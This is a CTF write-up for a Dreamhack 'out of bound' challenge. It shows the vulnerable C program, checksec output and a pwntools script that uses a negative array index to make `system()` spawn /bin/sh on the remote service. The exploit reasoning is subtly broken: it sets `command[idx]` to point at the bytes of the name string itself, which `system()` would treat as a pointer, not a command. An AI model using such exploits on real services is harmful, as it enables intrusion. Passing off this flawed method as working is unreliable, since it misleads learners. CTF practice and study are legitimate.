---
title: "OUT-OF-BOUND FROM DREAMHACK CHALLENGE"
date: 2024-01-02 00:00:00 +0700
categories: [Binary Exploitation, Out-of-Bound]
tags: [pwn, oob, dreamhack, system]
author: datious
description: "Writeup for Dreamhack OOB challenge — exploiting unvalidated array index to execute /bin/sh via the command[] array."
---

# OUT-OF-BOUND FROM DREAMHACK CHALLENGE
**Author: D1n0_09**

Today I will solve a challenge that has a name is **out of bound**.

## 1. Cursory

**Program source:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;
    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");
    scanf("%d", &idx);
    system(command[idx]);

    return 0;
}
```

**Security layers:**

```
checksec out_of_bound
[*] '/home/kali/Downloads/dreamhack/out_of_bound'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## Analysis

When analyzing the binary, a clear loophole appears: `idx` is declared as `int` (signed). The `command[]` array only has 10 elements. When a user provides an `idx` outside `[0, 9]`, the program accesses memory outside the `command[]` array — this is Out-of-Bound.

Since **NX is enabled**, we cannot inject shellcode. But since **Partial RELRO** is enabled and **PIE is disabled**, we can manipulate the GOT.

## 2. Exploitation

**My idea:** Write the string `/bin/sh` into the `name` variable (located in the BSS), then use a negative OOB index so that `command[idx]` points to `name`. Then `system(command[idx])` → `system("/bin/sh")`.

**Steps:**
1. Input `/bin/sh\x00` as `Admin name`
2. Calculate the negative `idx` such that `&command[idx] == &name`
3. `idx = (name_addr - command_addr) / 4` (32-bit, each pointer is 4 bytes)

```python
from pwn import *

p = remote("host", port)

name_addr = 0x...    # BSS address of name
cmd_addr  = 0x...    # BSS address of command[]

idx = (name_addr - cmd_addr) // 4

p.sendafter("Admin name: ", b"/bin/sh\x00")
p.sendlineafter("What do you want?: ", str(idx))
p.interactive()
```
